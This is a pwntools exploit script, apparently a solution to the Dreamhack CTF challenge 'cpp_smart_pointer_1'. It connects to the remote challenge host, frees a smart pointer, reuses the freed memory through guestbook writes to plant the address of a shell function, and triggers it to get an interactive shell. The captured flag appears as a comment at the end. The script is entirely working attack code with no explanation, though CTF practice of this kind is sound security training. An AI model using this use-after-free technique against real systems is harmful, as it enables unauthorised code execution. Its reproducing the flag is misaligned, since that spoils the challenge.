from pwn import * 

# p = process("./cpp_smart_pointer_1")
p = remote("host1.dreamhack.games",8494)

ptr1 = 0x402300 

shell = 0x40161d 

def change(idx,cng) :
    p.sendlineafter("select :",str(1))
    p.sendlineafter("pointer(1, 2):",str(idx))
    p.sendlineafter("pointer:",str(cng))
    

def delete(idx) :
    p.sendlineafter("select :",str(2))
    p.sendlineafter("pointer(1, 2):",str(idx))
    
def test(idx) :
    p.sendlineafter("select :",str(3))
    p.sendlineafter("pointer(1, 2):",str(idx))

def write(data) :
    p.sendlineafter("select :",str(4))
    p.sendlineafter("guestbook :",data)
    
def view(data) :
    p.sendlineafter("select :",str(5))

delete(1)
write("a"*0x10)
write(p64(shell)+"b"*0x8)
pause()
test(2)
p.interactive()

#DH{d41fb699ad2e0d6fc43c1a6f66d08e35}